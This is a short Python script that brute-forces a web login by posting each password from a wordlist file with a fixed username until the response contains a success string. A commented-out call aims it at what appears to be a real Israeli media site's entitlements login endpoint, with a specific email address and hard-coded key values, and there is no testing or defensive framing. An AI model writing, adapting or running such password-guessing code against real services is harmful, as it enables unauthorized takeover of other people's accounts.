import threading
import queue
import requests


#TODO: flask
local_password = ""
def send_request(url, parms, succesmsg):
    x = requests.post(url, data=parms)
    if x.text.__contains__(succesmsg):
        local_password = parms
        print(f"Success {local_password}")
        return f"Success {local_password}"
    else:
        print(f"Not {parms}")
        return "Not the pass"

def brute_force(url, user, passwords, succesmsg, usField,passField,keys):
    for password in passwords:
        data = {
  usField: user,
    passField: password
}
        data.update(keys)
        method = send_request(url,data,succesmsg)
        if method.__contains__("Success"):
            return method


print(requests.post("http://127.0.0.1:5000/a", data={

}))



keys={"du":"W42b2a4532b04a721c985f6094921a7725aa",
    "da":"6gkr2ks9-4610-392g-f4s8-d743gg4623k2"}
password_files = open("passwords.txt", "r+")
passwords = password_files.read().splitlines()
#brute_force("https://mass.mako.co.il/ClicksStatistics/entitlementsServicesV2.jsp?et=nln", "qaroofx@gmail.com", passwords, "Success", "eu", "dwp", keys)
